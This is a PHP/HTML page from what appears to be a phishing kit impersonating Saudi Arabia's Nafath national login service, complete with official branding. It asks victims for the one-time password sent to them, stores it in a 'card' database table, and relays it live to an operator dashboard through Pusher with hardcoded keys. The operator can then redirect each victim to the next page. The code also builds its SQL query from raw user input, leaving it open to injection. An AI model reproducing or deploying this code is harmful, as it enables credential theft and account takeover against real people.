<?php
error_reporting(0);
ini_set('display_errors', 0);
########################
session_start();

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');
require __DIR__ . '/vendor/autoload.php';

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'رمز مرور مرسل نفاذ');

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $dataa = [
        'userId' => $_SESSION['user_id'],
        'page' =>  'رمز مرور مرسل نفاذ'
    ];

    $pusher->trigger('temaeen-new', 'curreneft-page', $dataa);
}


if (isset($_POST['submit_Authentication_cdaode'])) {
    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );
    //print_r($_POST);
    $new_code = $_POST['New_code'];

    include("DB_CON.php");

    $X = 0;
    $q = "UPDATE card SET New_code='$new_code',CheckTheInfo_Nafad='$X' WHERE id =" . $_SESSION['card_id'] . ";";

    $v = mysqli_query($con, $q);


    if ($v) {
        mysqli_close($con);

        $site = array(
            'message' => 'رمز مرور مرسل نفاذ',
            'type' => '3'
        );
        $userId = $_SESSION['user_id'];

        $User->UpdateStatus($userId,  'رمز مرور مرسل نفاذ');

        $data = [
            'userId' => $userId,
            'updatedData' => $site
        ];

        $pusher->trigger('temaeen-new', 'update-user-accountt', $data);

        SendDynamic('رمز مرور مرسل نفاذ', $new_code);

        echo "<script>document.location.href='wait-nafath.php';</script>";
    }
}
if (isset($_GET['reject'])) {
    $showError = true;
}
?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NAFAD</title>
    <!-- CSS only -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
    <!-- JavaScript Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@200;300&display=swap" rel="stylesheet">
    <style>
        nav {
            overflow: auto;
        }

        .nafad {
            margin-right: 222px;
            float: right;
        }

        a {
            text-decoration: none;
        }

        .ff ul {
            list-style-type: none;
        }

        .ff ul li {
            display: inline;
            padding: 10px;
            font-weight: bold;
        }

        @media only screen and (max-width: 600px) {
            nav {
                overflow: hidden;
            }

            .nafad {
                float: none;
                margin-left: 230px;
            }
        }

        input {
            height: 50px !important;
            text-align: end;
            font-weight: bold !important;
            border-color: rgb(200, 224, 254) !important;
        }

        input:hover {
            background-color: lightgray;
        }

        ::-webkit-input-placeholder {
            text-align: right;
            font-weight: bold;
        }

        .tawtheg {
            transition: all 0.4s ease-in-out;
        }

        .tawtheg:hover {
            background-color: rgb(3, 71, 3) !important;
        }

        .fef{
            font-size: 13px;
        }
    </style>

</head>

<body class="bg-light" style="font-family:'Tajawal', sans-serif; overflow-x: hidden;">

    <header class="shadow-sm" style=" background-color: white;">
        <nav>
            <img src="./assets/nafad.png" class="nafad my-4" />
        </nav>
    </header>

    <main>
        <div class="container-fluid bg-light" style="margin: 100px 0;">
            <div class="row">
                <div class="col-sm-12 text-center">
                    <!-- <img src="./assets/point.png" class="mt-4"><br> -->
                    <h4 class="text-center mt-4" style="font-weight: bold;">سيتم إرسال كلمة المرور الخاصة بكم لإتمام تسجيل التأمين وربطه بالرقم المسجل يرجى إدخال كلمة المرور المرسلة</h4>
                </div>
            </div>

            <div class="row d-flex justify-content-center mt-5">
                <div class="col-sm-6 col-lg-4">

                    <form method="POST" action="">
                        <label class="form-label fw-bold float-end">كلمة المرور</label>
                        <input type="text" required name="New_code" required class="form-control" placeholder="أدخل كلمة المرور ">
                        <?php
                        // Check if data is submitted
                        if (isset($showError)) {
                            echo '<p class="text-center fef mt-3 text-danger fw-bold">كلمة المرور غير صحيحه</p>';
                        }
                        ?>
                        <button type="submit" name="submit_Authentication_cdaode" class="tawtheg w-100 text-center btn fw-bold mt-5" style="background-color:#11998E; color: white; letter-spacing: 1px;">إنهاء</button>
                    </form>



                </div>
            </div>
        </div>
    </main>

    <footer>
        <div class="container rounded" style="background-color: #dddddd; overflow: hidden;">
            <div class="row d-flex align-items-center pt-3">
                <div class="col-sm-3 col-lg-3 mt-4">
                    <p class="fw-bold text-end">تطوير وتشغيل</p>
                    <h2 class="fw-bold text-end">مركز المعلومات الوطني</h2>
                    <p class="fw-bold text-end">النفاذ الوطني الموحد جميع الحقوق محفوظة © 2022</p>
                </div>
                <div class="col-sm-3 col-lg-3 text-center">
                    <img src="./assets/NIC.png">
                </div>
            </div>
        </div>
    </footer>
    <script src="js/main.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id']); ?>;

        Pusher.logToConsole = true;

        var pusher = new Pusher('4a9de0023f3255d461d9', {
            cluster: 'ap2'
        });

        var channel = pusher.subscribe('my-channel-new-jaz');

        channel.bind('page-tamen-new', function(data) {

            if (data.userId === userIdFromSession) {
                document.location.href = data.page;
            }

        });
    </script>
</body>

</html>